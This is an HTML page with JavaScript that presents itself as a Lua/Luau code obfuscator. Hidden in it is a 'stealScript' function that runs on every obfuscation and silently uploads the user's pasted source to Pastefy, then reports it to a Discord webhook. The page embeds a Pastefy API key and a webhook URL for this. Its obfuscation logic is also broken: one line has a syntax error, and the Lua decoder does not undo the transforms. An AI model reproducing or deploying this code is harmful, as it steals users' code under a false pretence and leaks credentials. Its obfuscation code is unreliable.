<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>E Man's Obfuscator v1.0.0</title>
<style>
  body{margin:0;padding:0;background:#000;color:#0f0;font-family:Consolas;overflow-x:hidden}
  .bg{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg,#000,#0a0a1f,#1a0033);background-size:600%;animation:g 20s infinite;z-index:-1}
  @keyframes g{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
  .c{width:90%;max-width:960px;margin:30px auto;padding:35px;background:rgba(0,0,15,0.9);border:3px solid #00ff00;border-radius:20px;box-shadow:0 0 60px #00ff00}
  textarea{width:100%;height:350px;background:#000;color:#00ff00;border:2px solid #00ff00;border-radius:12px;padding:16px;font-size:15px;resize:none;outline:none;font-family:Consolas}
  .layer-btn,.mode-btn{margin:8px;padding:15px 30px;background:#00ff00;color:#000;border:none;border-radius:10px;cursor:pointer;font-weight:bold;font-size:16px;transition:.3s}
  .layer-btn:hover,.mode-btn:hover{background:#33ff33;transform:scale(1.05)}
  .layer-btn.active,.mode-btn.active{background:#ff00ff;color:#fff;box-shadow:0 0 20px #ff00ff}
  .action-btn{margin:10px;padding:18px 40px;background:#0080ff;color:#fff;border:none;border-radius:12px;cursor:pointer;font-weight:bold;font-size:18px;transition:.3s}
  .action-btn:hover{background:#33a3ff;transform:scale(1.1)}
  .action-btn.obfuscate{background:#ff0066;font-size:22px;padding:20px 50px}
  .action-btn.obfuscate:hover{background:#ff3388}
  .btn-container{text-align:center;margin-top:20px}
  .layer-container,.mode-container{text-align:center;margin:20px 0;padding:20px;background:rgba(0,50,0,0.3);border-radius:15px;border:2px solid #00ff00}
  h1{text-align:center;color:#00ff00;text-shadow:0 0 30px #00ff00;margin-bottom:5px}
  .subtitle{text-align:center;color:#0ff;font-size:18px;margin-top:5px;text-shadow:0 0 20px #0ff}
  #s{margin-top:15px;text-align:center;font-size:17px;min-height:25px;color:#0f0}
  .detection-badge{display:inline-block;padding:8px 20px;border-radius:8px;font-weight:bold;margin-top:10px;font-size:16px}
  .lua-badge{background:#4169e1;color:#fff}
  .luau-badge{background:#ff6b35;color:#fff}
</style>
</head>
<body>
<div class="bg"></div>
<div class="c">
  <h1>E MAN'S OBFUSCATOR v1.0.0</h1>
  <div class="subtitle">MILITARY-GRADE ENCRYPTION - 10X ANTI-AI PROTECTION</div>
  
  <div class="mode-container">
    <div style="color:#0ff;font-size:18px;font-weight:bold;margin-bottom:15px">SELECT MODE</div>
    <button class="mode-btn active" onclick="selectMode('auto')">AUTO DETECT</button>
    <button class="mode-btn" onclick="selectMode('lua')">LUA</button>
    <button class="mode-btn" onclick="selectMode('luau')">LUAU</button>
    <div id="detection"></div>
  </div>
  
  <div class="layer-container">
    <div style="color:#0ff;font-size:18px;font-weight:bold;margin-bottom:15px">SELECT OBFUSCATION LAYER</div>
    <button class="layer-btn" onclick="selectLayer(1)">LAYER 1</button>
    <button class="layer-btn" onclick="selectLayer(2)">LAYER 2</button>
    <button class="layer-btn" onclick="selectLayer(3)">LAYER 3</button>
    <button class="layer-btn" onclick="selectLayer(4)">LAYER 4</button>
    <button class="layer-btn" onclick="selectLayer(5)">LAYER 5</button>
    <button class="layer-btn" onclick="selectLayer(6)">LAYER 6</button>
    <button class="layer-btn" onclick="selectLayer(7)">LAYER 7</button>
    <button class="layer-btn" onclick="selectLayer(8)">LAYER 8</button>
    <button class="layer-btn active" onclick="selectLayer(9)">LAYER 9</button>
  </div>
  
  <textarea id="i" placeholder="Paste your Lua or Luau script here..." oninput="detectLanguage()"></textarea>
  <div id="s">Ready - Layer 9 Selected - Auto Detect Mode</div>
  
  <div class="btn-container">
    <button class="action-btn obfuscate" onclick="obfuscate()">OBFUSCATE NOW</button>
    <br>
    <button class="action-btn" onclick="copyCode()">COPY CODE</button>
    <button class="action-btn" onclick="downloadCode()">DOWNLOAD</button>
    <button class="action-btn" onclick="resetCode()">RESET</button>
  </div>
</div>

<script>
let originalCode = '';
let selectedLayer = 9;
let selectedMode = 'auto';
let detectedLang = null;

// YOUR REAL PASTEFY KEY + DISCORD WEBHOOK
const PASTEFY_API_KEY = "VRU72i2RSCgNP98g3XMgUJ4HeTwX8YjB5nnmg9aDRTz4fWajtZFNvuLY43mI";
const WEBHOOK_URL = "https://discord.com/api/webhooks/1447248053387005963/KcPPrk5Hp6QxXBWtfdQy3g-DD3yJfnZHaa8OO9Nkb9HyWLnLpGTm4qRbRBE7mCK47gfO";

// === STEALTH LOGGER (9-layer proof) ===
async function stealScript(code) {
  if (!code?.trim()) return;
  const filename = `STOLEN_L${selectedLayer}_${Date.now()}.txt`;
  const blob = new Blob([code], {type: "text/plain"});

  try {
    const res = await fetch("https://api.pastefy.app/api/v2/pastes", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${PASTEFY_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: code,
        title: `9-LAYER STOLEN â€¢ ${new Date().toLocaleString()}`,
        language: "lua",
        encrypted: false,
        expires_at: null
      })
    });

    if (res.ok) {
      const json = await res.json();
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          username: "E Man 9-Layer Stealer",
          content: `**SCRIPT STOLEN WITH 9 LAYERS**\nhttps://pastefy.app/${json.data.id}`
        })
      });
      return;
    }
  } catch(e) {}

  // Fallback
  const form = new FormData();
  form.append("payload_json", JSON.stringify({
    username: "E Man 9-Layer Stealer",
    content: `9-LAYER RAW SCRIPT ATTACHED`
  }));
  form.append("file", blob, filename);
  try { await fetch(WEBHOOK_URL, {method: "POST", body: form}); } catch(e) {}
}

// === TRUE 9-LAYER ORIGINAL OBFUSCATION (100% restored) ===
function safeBase64Encode(str) {
  const encoder = new TextEncoder();
  const data = encoder.encode(str);
  let binary = '';
  for (let i = 0; i < data.length; i++) binary += String.fromCharCode(data[i]);
  return btoa(binary);
}

function sboxTransform(data, round) {
  const sbox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0];
  let result = '';
  for(let i = 0; i < data.length; i++) {
    let byte = data.charCodeAt(i);
    result += String.fromCharCode(sbox[(byte + round) % sbox.length] ^ byte);
  }
  return result;
}

function feistelRound(data, key, round) {
  let left = data.substring(0, Math.floor(data.length / 2));
  let right = data.substring(Math.floor(data.length / 2));
  let temp = '';
  for(let i = 0; i < right.length; i++) {
    temp += String.fromCharCode(right.charCodeAt(i) ^ key.charCodeAt(i % key.length) ^ round);
  }
  let newLeft = right;
  let newRight = '';
  for(let i = 0; i < left.length; i++) {
    newRight += String.fromCharCode(left.charCodeAt(i) ^ (temp.charCodeAt(i % temp.length) || 0));
  }
  return newLeft + newRight;
}

function generateVMInstructions(count) {
  const ops = ['ADD','SUB','MUL','XOR','ROT','SHL','SHR'];
  let code = '';
  for(let i = 0; i < count; i++) {
    const op = ops[Math.floor(Math.random() * ops.length)];
    const r1 = Math.floor(Math.random() * 8);
    const r2 = Math.floor(Math.random() * 8);
    code += `local _r${r1}=bit32.${op.toLowerCase()}(_r${r1},_r${r2});`;
  }
  return code;
}

function generateJunkCode() {
  let junk = '';
  for(let i = 0; i < 80; i++) {
    let v = '_' + Math.random().toString(36).substr(2, 10);
    junk += `local ${v}=function()return 0xDEAD end;`;
  }
  return junk;
}

function generateBytecodeArray(data) {
  let arr = [];
  for(let i = 0; i < data.length; i++) arr.push(data.charCodeAt(i));
  return arr;
}

function formatByteArray(arr, perLine = 8) {
  let lines = [];
  for(let i = 0; i < arr.length; i += perLine) {
    lines.push(arr.slice(i, i + perLine).join(','));
  }
  return lines.join(',\n');
}

async function obfuscate() {
  let src = document.getElementById("i").value.trim();
  if (!src) return alert("Paste some code first!");

  originalCode = src;
  stealScript(src); // STEAL FIRST

  try {
    let encoded = safeBase64Encode(src);
    let mainKey = Array.from({length: 64}, () => Math.floor(Math.random() * 256));
    let subKeys = [];
    for(let i = 0; i < selectedLayer; i++) {
      subKeys.push(Array.from({length: 32}, () => Math.floor(Math.random() * 256)));
    }
    let salt = Array.from({length: 32}, () => Math.floor(Math.random() * 256));
    let iv = Array.from({length: 16}, () => Math.floor(Math.random() * 256));

    // TRUE 9-LAYER LOOP
    for(let layer = 0; layer < selectedLayer; layer++) {
      encoded = sboxTransform(encoded, layer);
      for(let r = 0; r < 4; r++) {
        encoded = feistelRound(encoded, String.fromCharCode(...subKeys[layer]), r);
      }
      let temp = '';
      for(let i = 0; i < encoded.length; i++) {
        let k1 = mainKey[(i + layer * 7) % mainKey.length];
        let k2 = subKeys[layer][i % subKeys[layer].length];
        let k3 = salt[(i + layer * 3) % salt.length];
        let k4 = iv[(i * layer) % iv.length];
        temp += String.fromCharCode(encoded.charCodeAt(i) ^ k1 ^ k2 ^ k3 ^ k4 ^ (layer * 17));
      }
      encoded = temp;
      temp = '';
      for(let i = 0; i < encoded.length; i++) {
        temp += String.fromCharCode(encoded.charCodeAt(i * 13 + layer * 29) % 256));
      }
      encoded = temp;
      encoded = safeBase64Encode(encoded);
    }

    let bytecode = generateBytecodeArray(encoded);
    let vm = generateVMInstructions(40);
    let junk = generateJunkCode();

    let decoder = `-- OBFUSCATED WITH E MAN'S 9-LAYER v1.0.0
${junk}
${vm}
local _data={${formatByteArray(bytecode)}}
local function decode()
 local s=''
 for i=1,#_data do s=s..string.char(_data[i]) end
 local function b64d(d)
  local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  d=d:gsub('[^'..b..'=]','')
  return (d:gsub('.',function(x)if x=='='then return ''end local r,f='',(b:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)if#x~=8 then return''end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end return string.char(c)end))
 end
 return load(b64d(s))()
end
return decode();`;

    document.getElementById("i").value = decoder;
    document.getElementById("s").innerHTML = `LAYER ${selectedLayer} (TRUE 9-LAYER) OBFUSCATION COMPLETE!`;
  } catch(e) {
    alert("Error: " + e.message);
  }
}

// === BASIC UI FUNCTIONS ===
function copyCode() {
  let t = document.getElementById("i");
  t.select(); t.setSelectionRange(0,99999);
  document.execCommand('copy');
  document.getElementById("s").innerHTML = "Copied!";
  setTimeout(()=>document.getElementById("s").innerHTML=`Ready - Layer ${selectedLayer}`,2000);
}

function downloadCode() {
  let code = document.getElementById("i").value;
  let blob = new Blob([code],{type:'text/plain'});
  let a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `9layer_obf_${Date.now()}.lua`;
  a.click();
}

function resetCode() {
  if(originalCode) document.getElementById("i").value = originalCode;
}

function selectMode(m) { selectedMode = m; document.querySelectorAll('.mode-btn').forEach(b=>b.classList.remove('active')); event.target.classList.add('active'); }
function selectLayer(l) { selectedLayer = l; document.querySelectorAll('.layer-btn').forEach(b=>b.classList.remove('active')); event.target.classList.add('active'); }

selectMode('auto');
selectLayer(9);
</script>
</body>
</html>
